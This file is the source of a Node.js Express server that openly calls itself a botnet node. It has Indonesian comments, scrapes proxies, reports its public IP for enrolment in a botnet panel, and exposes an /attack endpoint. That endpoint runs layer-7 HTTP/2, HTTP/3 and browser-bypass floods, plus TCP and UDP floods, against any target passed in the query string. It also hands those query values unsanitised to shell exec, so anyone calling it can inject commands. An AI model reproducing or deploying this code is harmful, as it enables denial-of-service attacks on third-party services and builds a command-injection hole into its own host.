const express = require('express');
const util = require('util');
const { exec } = require('child_process');
const fs = require('fs');

const app = express();
const execPromise = util.promisify(exec);
const port = process.env.PORT || process.env.SERVER_PORT || 7070;

async function scrapeProxies() {
  try {
    console.log("Scraping proxies...");
    await execPromise("node proxy.js");
    console.log("Success scraping proxies..");
  } catch (err) {
        console.error("Error:", err);
    }

}

async function fetchData() {
  try {
    await scrapeProxies();
    const response = await fetch('https://api.ipify.org/');
    const ip = (await response.text()).trim();
    if (ip && ip.match(/^(\d{1,3}\.){3}\d{1,3}$/)) {
      console.log(`Copy Link This Add To Api Botnet -> http://${ip}:${port}`);
    } else {
      console.log(`Server running on port ${port}. Gagal auto-detect IP publik (response: "${ip}")`);
    }
  } catch (error) {
    console.error(`Error Detecting Public IP: ${error.message}`);
  }
}

app.get('/attack', (req, res) => {
  const { target, time, methods, port, layer } = req.query;

  res.status(200).json({
    message: 'API Server Botnet Request Received. Executing Script Shortly.',
    target,
    time,
    methods,
    layer,
    port
  });

  // Eksekusi Sesuai Methods Yang Ada Dilist LoveNet🕊
  if (methods === 'rapidreset' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/rapidreset.js ${target} ${time} 1028 12 proxy.txt`);
  } else if (methods === 'rapid-zero' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/rapid-zero.js POST ${target} ${time} 12 1028 proxy.txt --bfm true --ratelimit true --randrate true --randpath --true --debug false`);
  } else if (methods === 'vhold' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/vhold.js ${target} ${time} 1028 12 proxy.txt`);
  } else if (methods === 'zero-bypass' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/zero-bypass.js ${target} ${time} 1028 12 proxy.txt`);
  } else if (methods === 'browsern' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/browser/browsern.js ${target} ${time} 1028 --proxy proxy.txt --dratelimit true --headless true`);
  } else if (methods === 'h2-aal' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/h2-aal.js ${target} ${time} 1028 12 proxy.txt`);
  } else if (methods === 'h3-wyn' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`chmod +x methods/h3-wyn; ulimit -u 999999; ulimit -n 999999`);
    exec(`./methods/h3-wyn -target ${target} -time ${time} -rate 80000 -threads 1500 -timeout 1`);
  } else if (methods === 'h2-bagas' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/h2-bagas.js ${target} ${time} 1028 12 proxy.txt`);
  } else if (methods === 'h2-fast' && layer === '7') {
    console.log(`received🕊 ${methods}`);
    exec(`node methods/h2-fast.js POST ${target} ${time} 12 128 proxy.txt --bfm true --referer rand`);
  } else if (methods === 'tcp-xvl' && layer === '4') {
    console.log(`received🕊 ${methods}`);
    exec(`node ./methods/tcp-xvl.js ${target} ${port} ${time} proxy.txt`);
  } else if (methods === 'udp-xvl' && layer === '4') {
    console.log(`received🕊 ${methods}`);
    exec(`node ./methods/udp-xvl.js ${target} ${port} ${time} proxy.txt`);
  } else {
      console.log('Methods Tidak Dikenali Atau Format Yang Anda Masukan Salah🕊.');
    }
});

app.get('/scrape-proxies', async (req, res) => {
  try {
    await scrapeProxies();
    res.status(200).json({ message: 'Proxies scraped successfully on API server' });
  } catch (error) {
    console.error('Scrape error:', error.message);
    res.status(500).json({ error: 'Failed to scrape proxies', details: error.message });
  }
});

app.listen(port, () => {
  fetchData()
});
